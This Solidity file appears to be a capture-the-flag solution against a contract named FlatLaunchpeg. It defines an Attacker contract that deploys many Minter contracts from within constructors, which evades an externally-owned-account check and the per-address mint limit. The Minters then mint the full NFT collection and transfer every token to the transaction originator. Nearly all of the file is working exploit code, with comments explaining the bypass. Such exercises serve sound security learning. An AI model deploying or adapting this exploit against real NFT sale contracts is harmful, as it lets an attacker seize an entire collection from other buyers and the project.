pragma solidity ^0.8.4;

import "./FlatLaunchpeg.sol";

contract Attacker {
    FlatLaunchpeg immutable victim;

    constructor(FlatLaunchpeg _victim) {
        victim = _victim;
        //To avoid the first safeguard that checks wether msg.sender is an eoa we're simply calling the attack method from the contract. Hence at this stage there is no bytecode beeing deployed
        attack();
    }

    function attack() private {
        uint256 end = (victim.collectionSize() /
            victim.maxPerAddressDuringMint()) + 1;
        for (uint256 i = 0; i < end; i++) {
            uint256 quantity = victim.collectionSize() - victim.totalSupply() >
                victim.maxPerAddressDuringMint()
                ? victim.maxPerAddressDuringMint()
                : victim.collectionSize() - victim.totalSupply();

            new Minter(victim, i, quantity);
        }
    }
}

contract Minter {
    FlatLaunchpeg immutable victim;
    uint256 idx;
    uint256 immutable quantity;

    constructor(
        FlatLaunchpeg _victim,
        uint256 _idx,
        uint256 _quantity
    ) {
        victim = _victim;
        idx = _idx;
        quantity = _quantity;
        //To avoid the first safeguard that checks wether msg.sender is an eoa we're simply calling the attack method from the contract. Hence at this stage there is no bytecode beeing deployed
        mint();
    }

    function mint() private {
        victim.publicSaleMint{value: msg.value}(quantity);
        for (uint256 i = 0; i < quantity; i++) {
            victim.transferFrom(
                address(this),
                tx.origin,
                idx * victim.maxPerAddressDuringMint() + i
            );
        }
    }
}
